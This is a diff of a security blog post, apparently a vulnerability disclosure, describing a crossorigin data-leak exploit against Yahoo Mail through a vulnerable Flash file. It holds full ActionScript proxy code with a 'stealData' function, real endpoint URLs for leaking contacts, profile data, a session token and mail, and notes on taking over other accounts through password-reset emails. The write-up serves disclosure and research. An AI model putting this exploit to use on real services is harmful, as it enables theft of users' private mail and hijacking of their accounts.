+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">exteriorXML</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">DATA3</span><span class="o">:</span><span class="nb">XML</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="k">var</span> <span class="nx">dataPath</span><span class="o">;</span>
+</span><span class='line'>  <span class="c1">// ... snip</span>
 </span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">loadXML2</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
 </span><span class='line'>        <span class="k">var</span> <span class="nx">ldr</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
 </span><span class='line'>        <span class="k">var</span> <span class="nx">loader_IO_ERROR</span><span class="o">:*</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
@@ -424,9 +1149,17 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>As you can see, the code makes a request to <code>this.dataPath</code> concatenated with <code>this.exteriorXML1</code>.  When it gets a response, it parses it as XML, and stores the result in <code>this.DATA3</code>. But we control all 3 of those members due to the <code>public</code> access modifiers and <code>Security.allowDomain("*")</code>, and can both read from <em>and</em> write to them from .swfs on our own domain. Given that we control the URL requested, can read the response, and can trigger the behaviour at will, all from a crossorigin Flash document, we&rsquo;ve got crossorigin data leakage!</p>
+
+
+<p>As you can see, the code makes a request to <code>this.dataPath</code> concatenated with <code>this.exteriorXML1</code>.  When it gets a response, it parses it as XML, and stores the result in <code>this.DATA3</code>. But we control all 3 of those members due to the <code>public</code> access modifiers and <code>Security.allowDomain("*")</code>, and can both read from <em>and</em> write to them from .swfs on our own domain. Given that we control the URL requested, can read the response, and can trigger the behaviour at will, all from a crossorigin Flash document, we&rsquo;ve got crossorigin data leakage!</p>
+
+
+
 
 <p>Well&hellip; with a few caveats:</p>
+
+
+
 
 <ul>
 <li>The target endpoint must respond to <code>GET</code>s</li>
@@ -436,11 +1169,19 @@
 </ul>
 
 
+
+
 <h2>First Steps</h2>
+
+
+
 
 <p>Let&rsquo;s start by making some ActionScript to embed and exploit <code>hotspotgallery.swf</code>. From here on you will need to be logged in to Yahoo! for some links to work. Here we&rsquo;ve got a very simple JS<->Flash proxy in the style of CrossXHR. It loads up the vulnerable .swf, sets its public members so it&rsquo;ll request the resource we want to leak, then returns the response back to JS:</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -540,150 +1281,215 @@
 <span class='line-number'>98</span>
 <span class='line-number'>99</span>
 <span class='line-number'>100</span>
-</pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">package</span> <span class="p">{</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">display</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">events</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">external</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">net</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">text</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="o">*;</span>
-</span><span class='line'><span class="kd">import</span> <span class="nx">flash</span><span class="p">.</span><span class="nx">system</span><span class="p">.</span><span class="o">*;</span>
+</pre></td><td class='code'><pre><code class='as3'><span class='line'><span class="kd">package</span> <span class="o">{</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.display.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.events.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.external.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.net.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.text.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.utils.</span><span class="o">*;</span>
+</span><span class='line'><span class="k">import</span> <span class="nn">flash.system.</span><span class="o">*;</span>
 </span><span class='line'>
-</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nx">YahooFlasher</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="n">YahooFlasher</span> <span class="kd">extends</span> <span class="n">MovieClip</span> <span class="o">{</span>
 </span><span class='line'>
 </span><span class='line'>    <span class="c1">// Vulnerable SWF to make our requests through</span>
-</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">PROXY_URL</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="s2">&quot;http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf&quot;</span><span class="o">;</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="n">PROXY_URL</span><span class="p">:</span><span class="kt">String</span> <span class="o">=</span> <span class="s2">&quot;http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf&quot;</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'>    <span class="c1">// Get just the origin from a fully-qualified URL</span>
-</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="nx">ORIGIN_REGEX</span><span class="o">:</span><span class="nb">RegExp</span> <span class="o">=</span> <span class="sr">/^(\w+:\/\/[^\/]+\/).*/</span><span class="o">;</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">const</span> <span class="n">ORIGIN_REGEX</span><span class="p">:</span><span class="kt">RegExp</span> <span class="o">=</span> <span class="sr">/^(\w+:\/\/[^\/]+\/).*/</span><span class="o">;</span>
 </span><span class='line'>
-</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">YahooFlasher</span><span class="p">()</span> <span class="p">{</span>
-</span><span class='line'>        <span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">ADDED_TO_STAGE</span><span class="o">,</span> <span class="nx">onAdded</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function </span><span class="nf">YahooFlasher</span><span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>        <span class="n">addEventListener</span><span class="o">(</span><span class="n">Event</span><span class="o">.</span><span class="na">ADDED_TO_STAGE</span><span class="o">,</span> <span class="n">onAdded</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
 </span><span class='line'>
-</span><span class='line'>    <span class="kd">private</span> <span class="kd">function</span> <span class="nx">onAdded</span><span class="p">(</span><span class="nx">e</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">private</span> <span class="kd">function </span><span class="nf">onAdded</span><span class="o">(</span><span class="n">e</span><span class="o">:</span><span class="kt">Event</span><span class="o">):</span><span class="kt">void</span> <span class="o">{</span>
 </span><span class='line'>        <span class="c1">// Set timeout to avoid syncronous issues</span>
-</span><span class='line'>        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">available</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">setTimeout</span><span class="o">(</span><span class="kd">function</span><span class="o">():</span><span class="kc">void</span> <span class="o">{</span>
+</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">ExternalInterface</span><span class="o">.</span><span class="na">available</span><span class="o">)</span> <span class="o">{</span>
 </span><span class='line'>                <span class="c1">// Let&#39;s not make *ourselves* vulnerable to weird exploits.</span>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">swfOrigin</span><span class="o">:</span><span class="nb">String</span> <span class="o">=</span> <span class="nx">loaderInfo</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">ORIGIN_REGEX</span><span class="o">,</span> <span class="s2">&quot;$1&quot;</span><span class="p">);</span>
-</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ORIGIN_REGEX</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">swfOrigin</span><span class="p">)</span> <span class="o">||</span> <span class="nx">swfOrigin</span> <span class="o">!=</span> <span class="nb">Security</span><span class="p">.</span><span class="nx">pageDomain</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;alert&quot;</span><span class="o">,</span> <span class="s2">&quot;AY! This .swf needs to be on the same page as the one embedding it!&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">swfOrigin</span><span class="p">:</span><span class="kt">String</span> <span class="o">=</span> <span class="n">loaderInfo</span><span class="o">.</span><span class="na">url</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="n">ORIGIN_REGEX</span><span class="o">,</span> <span class="s2">&quot;$1&quot;</span><span class="o">);</span>
+</span><span class='line'>                <span class="k">if</span><span class="o">(!</span><span class="n">ORIGIN_REGEX</span><span class="o">.</span><span class="na">test</span><span class="o">(</span><span class="n">swfOrigin</span><span class="o">)</span> <span class="o">||</span> <span class="n">swfOrigin</span> <span class="o">!=</span> <span class="n">Security</span><span class="o">.</span><span class="na">pageDomain</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="s2">&quot;alert&quot;</span><span class="o">,</span> <span class="s2">&quot;AY! This .swf needs to be on the same page as the one embedding it!&quot;</span><span class="o">);</span>
 </span><span class='line'>                    <span class="k">return</span><span class="o">;</span>
-</span><span class='line'>                <span class="p">}</span>
-</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">addCallback</span><span class="p">(</span><span class="s2">&quot;stealData&quot;</span><span class="o">,</span> <span class="nx">stealData</span><span class="p">);</span>
-</span><span class='line'>                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="s2">&quot;flasherReady&quot;</span><span class="p">);</span>
-</span><span class='line'>            <span class="p">}</span>
-</span><span class='line'>        <span class="p">}</span><span class="o">,</span> <span class="mi">1</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>                <span class="o">}</span>
+</span><span class='line'>                <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">addCallback</span><span class="o">(</span><span class="s2">&quot;stealData&quot;</span><span class="o">,</span> <span class="n">stealData</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="s2">&quot;flasherReady&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="o">}</span>
+</span><span class='line'>        <span class="o">},</span> <span class="mi">1</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
 </span><span class='line'>
-</span><span class='line'>    <span class="kd">public</span> <span class="kd">function</span> <span class="nx">stealData</span><span class="p">(</span><span class="nx">targetURL</span><span class="o">:</span><span class="nb">String</span><span class="o">,</span> <span class="nx">callback</span><span class="o">:</span><span class="nb">String</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">function </span><span class="nf">stealData</span><span class="o">(</span><span class="n">targetURL</span><span class="o">:</span><span class="kt">String</span><span class="o">,</span> <span class="n">callback</span><span class="o">:</span><span class="kt">String</span><span class="o">):</span><span class="kt">void</span> <span class="o">{</span>
 </span><span class='line'>        <span class="c1">///</span>
 </span><span class='line'>        <span class="c1">/// Steal data through the proxy SWF, response body must look like</span>
 </span><span class='line'>        <span class="c1">/// valid XML and status code must not be &gt;= 400.</span>
 </span><span class='line'>        <span class="c1">///</span>
-</span><span class='line'>        <span class="k">var</span> <span class="nx">ldrComplete</span><span class="o">:</span><span class="nb">Function</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_arg1</span><span class="o">:</span><span class="nb">Event</span><span class="p">)</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>            <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span><span class="p">{</span>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">proxyClip</span><span class="o">:</span><span class="nb">Object</span> <span class="o">=</span> <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">content</span><span class="o">;</span>
+</span><span class='line'>        <span class="kd">var</span> <span class="n">ldrComplete</span><span class="p">:</span><span class="kt">Function</span> <span class="o">=</span> <span class="kd">function</span> <span class="o">(</span><span class="n">_arg1</span><span class="o">:</span><span class="n">Event</span><span class="o">):</span><span class="kc">void</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">setTimeout</span><span class="o">(</span><span class="kd">function</span><span class="o">():</span><span class="kc">void</span><span class="o">{</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">proxyClip</span><span class="p">:</span><span class="kt">Object</span> <span class="o">=</span> <span class="n">MCLoader</span><span class="o">.</span><span class="na">content</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'>                <span class="c1">// This thing&#39;s all janked and the request will be made to dataPath + &quot;/&quot; + exteriorXML1.</span>
 </span><span class='line'>                <span class="c1">// Try to make it so that this won&#39;t affect our target.</span>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">splitURL</span><span class="o">:</span><span class="nb">Array</span> <span class="o">=</span> <span class="nx">targetURL</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
-</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">dataPath</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
-</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">exteriorXML1</span> <span class="o">=</span> <span class="nx">splitURL</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">splitURL</span><span class="p">:</span><span class="kt">Array</span> <span class="o">=</span> <span class="n">targetURL</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">proxyClip</span><span class="o">.</span><span class="na">dataPath</span> <span class="o">=</span> <span class="n">splitURL</span><span class="o">.</span><span class="na">shift</span><span class="o">();</span>
+</span><span class='line'>                <span class="n">proxyClip</span><span class="o">.</span><span class="na">exteriorXML1</span> <span class="o">=</span> <span class="n">splitURL</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">);</span>
 </span><span class='line'>
 </span><span class='line'>                <span class="c1">// Triggers the HTTP Request through the vulnerable SWF</span>
-</span><span class='line'>                <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">loadXML2</span><span class="p">();</span>
+</span><span class='line'>                <span class="n">proxyClip</span><span class="o">.</span><span class="na">loadXML2</span><span class="o">();</span>
 </span><span class='line'>
-</span><span class='line'>                <span class="k">var</span> <span class="nx">timeLimit</span><span class="o">:</span><span class="nb">Number</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10000</span><span class="o">;</span>
+</span><span class='line'>                <span class="kd">var</span> <span class="n">timeLimit</span><span class="p">:</span><span class="kt">Number</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">Date</span><span class="o">().</span><span class="n">getTime</span><span class="o">()</span> <span class="o">+</span> <span class="mi">10000</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'>                <span class="c1">// Keep checking if the data&#39;s been loaded,</span>
 </span><span class='line'>                <span class="c1">// If `new XML(response)` raises, this will never be true,</span>
 </span><span class='line'>                <span class="c1">// the response has to look like valid XML, but most JSON</span>
 </span><span class='line'>                <span class="c1">// resources work too. Maybe because it sees it as one big </span>
 </span><span class='line'>                <span class="c1">// top-level TextNode?</span>
-</span><span class='line'>                <span class="kd">function</span> <span class="nx">checkFinished</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>                    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="o">:</span><span class="nx">void</span> <span class="p">{</span>
-</span><span class='line'>                        <span class="k">var</span> <span class="nx">stolenXML</span><span class="o">:</span><span class="nb">XML</span> <span class="o">=</span> <span class="nx">proxyClip</span><span class="p">.</span><span class="nx">DATA3</span><span class="o">;</span>
-</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                            <span class="k">var</span> <span class="nx">ret</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
+</span><span class='line'>                <span class="kd">function </span><span class="nf">checkFinished</span><span class="o">():</span><span class="kt">void</span> <span class="o">{</span>
+</span><span class='line'>                    <span class="n">setTimeout</span><span class="o">(</span><span class="kd">function</span><span class="o">():</span><span class="kc">void</span> <span class="o">{</span>
+</span><span class='line'>                        <span class="kd">var</span> <span class="n">stolenXML</span><span class="p">:</span><span class="kt">XML</span> <span class="o">=</span> <span class="n">proxyClip</span><span class="o">.</span><span class="na">DATA3</span><span class="o">;</span>
+</span><span class='line'>                        <span class="k">if</span><span class="o">(</span><span class="n">stolenXML</span> <span class="o">!==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>                            <span class="kd">var</span> <span class="n">ret</span><span class="p">:</span><span class="kt">String</span><span class="o">;</span>
 </span><span class='line'>                            <span class="c1">// If we get a simple node with no name, it&#39;s probably not even XML.</span>
 </span><span class='line'>                            <span class="c1">// Get the string representation without XML escaping.</span>
-</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">stolenXML</span><span class="p">.</span><span class="nx">name</span><span class="p">()</span> <span class="o">||</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">hasComplexContent</span><span class="p">())</span>
-</span><span class='line'>                                <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toXMLString</span><span class="p">();</span>
+</span><span class='line'>                            <span class="k">if</span><span class="o">(</span><span class="n">stolenXML</span><span class="o">.</span><span class="na">name</span><span class="o">()</span> <span class="o">||</span> <span class="n">stolenXML</span><span class="o">.</span><span class="na">hasComplexContent</span><span class="o">())</span>
+</span><span class='line'>                                <span class="n">ret</span> <span class="o">=</span> <span class="n">stolenXML</span><span class="o">.</span><span class="na">toXMLString</span><span class="o">();</span>
 </span><span class='line'>                            <span class="k">else</span>
-</span><span class='line'>                                <span class="nx">ret</span> <span class="o">=</span> <span class="nx">stolenXML</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+</span><span class='line'>                                <span class="n">ret</span> <span class="o">=</span> <span class="n">stolenXML</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
 </span><span class='line'>
-</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
+</span><span class='line'>                            <span class="k">if</span><span class="o">(</span><span class="n">callback</span><span class="o">)</span>
 </span><span class='line'>                                <span class="c1">// Flash can&#39;t be trusted to serialize `ret` properly. Just encode it.</span>
-</span><span class='line'>                                <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="nx">encodeURIComponent</span><span class="p">(</span><span class="nx">ret</span><span class="p">));</span>
-</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                                <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">callback</span><span class="o">,</span> <span class="n">encodeURIComponent</span><span class="o">(</span><span class="n">ret</span><span class="o">));</span>
+</span><span class='line'>                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
 </span><span class='line'>                            <span class="c1">// Hit a timeout when trying to fetch the response. Either a non-200 status code</span>
 </span><span class='line'>                            <span class="c1">// was returned, or we couldn&#39;t parse the body as XML :(</span>
-</span><span class='line'>                            <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">timeLimit</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                                <span class="k">if</span><span class="p">(</span><span class="nx">callback</span><span class="p">)</span>
-</span><span class='line'>                                    <span class="nb">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">callback</span><span class="o">,</span> <span class="kc">null</span><span class="p">);</span>
-</span><span class='line'>                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>                                <span class="nx">checkFinished</span><span class="p">();</span>
-</span><span class='line'>                            <span class="p">}</span>
-</span><span class='line'>                        <span class="p">}</span>
-</span><span class='line'>                    <span class="p">}</span><span class="o">,</span> <span class="mi">10</span><span class="p">);</span>
-</span><span class='line'>                <span class="p">}</span>
-</span><span class='line'>                <span class="nx">checkFinished</span><span class="p">();</span>
-</span><span class='line'>            <span class="p">}</span><span class="o">,</span> <span class="mi">100</span><span class="p">);</span>
-</span><span class='line'>        <span class="p">};</span>
+</span><span class='line'>                            <span class="k">if</span><span class="o">(</span><span class="k">new</span> <span class="kt">Date</span><span class="o">().</span><span class="n">getTime</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">timeLimit</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>                                <span class="k">if</span><span class="o">(</span><span class="n">callback</span><span class="o">)</span>
+</span><span class='line'>                                    <span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">callback</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span><span class='line'>                            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span><span class='line'>                                <span class="n">checkFinished</span><span class="o">();</span>
+</span><span class='line'>                            <span class="o">}</span>
+</span><span class='line'>                        <span class="o">}</span>
+</span><span class='line'>                    <span class="o">},</span> <span class="mi">10</span><span class="o">);</span>
+</span><span class='line'>                <span class="o">}</span>
+</span><span class='line'>                <span class="n">checkFinished</span><span class="o">();</span>
+</span><span class='line'>            <span class="o">},</span> <span class="mi">100</span><span class="o">);</span>
+</span><span class='line'>        <span class="o">};</span>
 </span><span class='line'>
 </span><span class='line'>        <span class="c1">// Load up the vulnerable proxy SWF</span>
-</span><span class='line'>        <span class="k">var</span> <span class="nx">MCLoader</span><span class="o">:</span><span class="nb">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Loader</span><span class="p">();</span>
-</span><span class='line'>        <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="k">new</span> <span class="nb">URLRequest</span><span class="p">(</span><span class="nx">PROXY_URL</span><span class="p">));</span>
-</span><span class='line'>        <span class="nx">MCLoader</span><span class="p">.</span><span class="nx">contentLoaderInfo</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="nb">Event</span><span class="p">.</span><span class="nx">COMPLETE</span><span class="o">,</span> <span class="nx">ldrComplete</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
+</span><span class='line'>        <span class="kd">var</span> <span class="n">MCLoader</span><span class="p">:</span><span class="kt">Loader</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">Loader</span><span class="o">();</span>
+</span><span class='line'>        <span class="n">MCLoader</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="k">new</span> <span class="kt">URLRequest</span><span class="o">(</span><span class="n">PROXY_URL</span><span class="o">));</span>
+</span><span class='line'>        <span class="n">MCLoader</span><span class="o">.</span><span class="na">contentLoaderInfo</span><span class="o">.</span><span class="na">addEventListener</span><span class="o">(</span><span class="n">Event</span><span class="o">.</span><span class="na">COMPLETE</span><span class="o">,</span> <span class="n">ldrComplete</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
 </span></code></pre></td></tr></table></div></figure>
+
+
 
 
 <p>Now here&rsquo;s the tricky part. We need to find interesting, leakable endpoints. We can&rsquo;t leak them if they return invalid XML (ruling out most webpages and JSON containing HTML fragments,) we can&rsquo;t leak them if they return a non-200 status code, and we can&rsquo;t leak them if they require an auth token we can&rsquo;t guess.</p>
 
+
+
+
 <p><a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/contacts;count=max;sort=asc?format=json&amp;view=compact&amp;_sc=1">Some</a> alternative <a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/profile;count=max;sort=asc?format=json&amp;_sc=1">endpoints</a> for the <a href="https://developer.yahoo.com/social/">Social API</a> fit the bill nicely. They let us fetch the current user&rsquo;s contacts and profile without requiring an auth token or user ID. You can see those leaking to a page we control here:</p>
+
+
+
 
 <p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/justsocialstuff.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/thumbs/justsocialstuff.png" width="640" height="480"></a></p>
 
+
+
+
 <h2>But What About Mail?</h2>
+
+
+
 
 <p>One that stumped me for a long time was getting the user&rsquo;s mail. All of the endpoints for mail listings required a valid WSSID (web services session id?) Unfortunately, all the endpoints I could find that would give me one had non-200 response codes or wouldn&rsquo;t parse as XML. I eventually found what I was looking for by running YMail&rsquo;s android app through mitmproxy. <a href="https://m.mg.mail.yahoo.com/hg/controller/controller.php">Here you can see the WSSID we wanted</a>, returned with a 200 response code. Even though this endpoint&rsquo;s normally requested with a <code>POST</code> method, a <code>GET</code> with no params still gives us the WSSID&hellip; Sweet!</p>
 
+
+
+
 <p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/ymail-mitm.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/thumbs/ymail-mitm.jpg" width="640" height="480"></a></p>
+
+
+
 
 <p>Let&rsquo;s leak the user&rsquo;s mail now. We&rsquo;ve got <a href="https://ca-mg6.mail.yahoo.com/mailsearch/v2/search?appid=YahooMailNeo&amp;wssid=PUT_WSSID_HERE&amp;sorting=-date&amp;query=%7B%22keyword%22%3A%22http%22%2C%22group%22%3A%7B%22from%22%3A%7B%7D%2C%22folder%22%3A%7B%7D%2C%22flags%22%3A%7B%22order%22%3A%22desc%22%7D%2C%22attachmenttype%22%3A%7B%7D%2C%22date%22%3A%7B%22unit%22%3A%22year%22%7D%7D%2C%22flags%22%3A%7B%22softdelete%22%3A0%7D%7D">a mail search endpoint here</a> that will return mail fragments without embedded HTML. You can see you&rsquo;ll still sometimes get angle brackets in the response due to inline replies, but you can muck with the query to get around those.</p>
 
+
+
+
 <p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/search-endpoint.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/thumbs/search-endpoint.png" width="640" height="480"></a></p>
+
+
+
 
 <p>Now, that WSSID functions as a CSRF token as well, so we can now do anything we want as the current user. We can send mail as them, delete all their emails, basically anything a normal user can do.</p>
 
+
+
+
 <p>Here&rsquo;s a small page demonstrating a bunch of things we can do as long as the user is on a page we control. As you can see, We&rsquo;ve got the full list of contacts, all of the user&rsquo;s personal details including their email address and name, and a listing of their emails.</p>
+
+
+
 
 <p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/show-all.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/thumbs/show-all.png" width="640" height="480"></a></p>
 
+
+
+
 <p>We&rsquo;ve got enough for a fully-weaponized exploit at this point. We can not only leak their emails, we can also achieve lateral movement by triggering password resets on other services they use, and pulling the reset URLs right out of their email, then deleting them. Of course, previously emailed username/password combos are fair game, too. Very handy for the APT folks ;)</p>
+
+
+
 
 <h2>The Fix</h2>
 
+
+
+
 <p><code>hotspotgallery.swf</code>&rsquo;s allowDomain call has since been changed to <code>Security.allowDomain("sp.yimg.com")</code>, but that doesn&rsquo;t fix the core issue. There are thousands and thousands of forgotten .swfs on disused subdomains, many of which are probably vulnerable to similar exploits. As long as those <code>crossdomain.xml</code> rules are as loose as they are, it&rsquo;s only a matter of time before someone finds one and exploits YMail&hellip; again.</p>
+
+
+
 
